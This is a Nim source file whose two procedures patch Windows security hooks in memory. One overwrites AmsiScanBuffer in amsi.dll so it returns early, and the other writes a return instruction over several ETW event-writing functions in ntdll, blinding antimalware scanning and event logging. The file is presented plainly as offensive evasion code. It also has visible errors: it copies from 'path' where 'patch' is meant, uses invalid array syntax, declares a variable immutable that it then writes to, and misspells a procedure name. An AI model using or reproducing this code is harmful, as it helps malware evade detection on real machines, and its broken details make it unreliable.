import winim/lean

proc PatchAMSI() =
    let size = 6
    var oldProtect: DWORD
    let patch: array[6, byte] = [
    0xB8'u8, 0x57, 0x00, 0x07, 0x80, 0xC3
    ]

    let amsi = LoadLibraryA("amsi.dll")
    if cast[uint](amsi) == 0:
        return
    let amsiscanbuffer = GetProcAddress(amsi,"AmsiScanBuffer")
    if cast[uint](amsiscanbuffer) == 0:
        return

    if VirtualProtect(amsiscanbuffer,size,PAGE_EXECUTE_WRITECOPY, addr oldProtect) != 0:
        copyMem(amsiscanbuffer,addr path,size)
        discard VirtualProtect(amsiscanbuffer,size,oldProtect, addr oldProtect)
    
proc PathETW() =
    let etwFuncs = [
      "EtwEventWrite",
      "EtwEventWriteEx",
      "EtwEventWriteFull",
      "EtwEventWriteString",
      "EtwEventWriteTransfer",
      "EtwEventActivityIdControl"
    ]
    let patch : array(1,byte) = [0xC3]
    let oldProtect : DWORD
    let size = 1
    let ntdll = GetModuleHandleA("ntdll.dll")
    if cast[uint](ntdll) == 0:
        return
    
    for f in etwFuncs:
        let function = GetProcAddress(ntdll,f)
        if cast[uint](function) == 0:
            continue
        if VirtualProtect(function,size,PAGE_EXECUTE_WRITECOPY,addr oldProtect) != 0:
            copyMem(function, addr path, size)
            discard VirtualProtect(function,size,oldProtect,addr oldProtect)
        
    




    

